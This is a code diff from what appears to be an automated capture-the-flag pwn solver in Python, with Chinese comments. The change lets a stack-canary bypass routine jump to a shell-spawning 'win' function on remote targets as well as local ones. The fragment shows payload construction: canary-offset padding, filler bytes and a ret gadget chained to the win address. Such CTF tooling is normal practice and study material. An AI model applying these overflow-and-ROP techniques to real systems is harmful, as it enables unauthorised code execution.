@@ -484,8 +484,9 @@ def _try_canary_fmt(ch: Challenge, f: Facts, plan: S.Plan, post_cmds: list = Non
             pad = b"A" * canary_off
             tail = b"B" * (off - canary_off - ch.wordsize)
             shell_win = f.shell_win
-            if shell_win is not None and not getattr(ch, "host", None):
-                # 本地 + 有 win：直接 ret 到 win（无参数需求，execve('/bin/sh') 型）
+            if shell_win is not None:
+                # 有 win：直接 ret 到 win（cannary 型 backdoor 自带 execve('/bin/sh')，
+                # 无参数需求——本地远程通吃；ret2libc 路线反而需要 pop_rdi）
                 if bits == 64:
                     ret_g = f.gadgets.get("ret")
                     chain = (ch.p64(ret_g) if ret_g else b"") + ch.p64(shell_win.addr)
